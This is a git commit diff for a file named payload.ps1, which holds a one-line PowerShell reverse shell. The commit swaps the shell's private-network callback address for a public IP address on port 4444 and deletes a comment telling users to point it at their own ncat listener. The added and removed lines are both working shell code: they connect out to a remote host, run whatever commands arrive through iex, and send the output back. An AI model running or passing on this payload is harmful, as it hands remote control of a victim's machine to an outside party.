93b68fcc2ad314e161f43b72f61800ccf53e9f11
Kilian-Schwarz <Kilian@webschwarz.de>
2021-04-30 11:43:53 +0200

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,3 +1,1 @@
-#Change the domain name theboss.lol to your domain name and the port number 4444 to the port number ncat is listening to
-
-$sm=(New-Object Net.Sockets.TCPClient('192.168.8.103',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$sm=(New-Object Net.Sockets.TCPClient('217.79.181.132',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
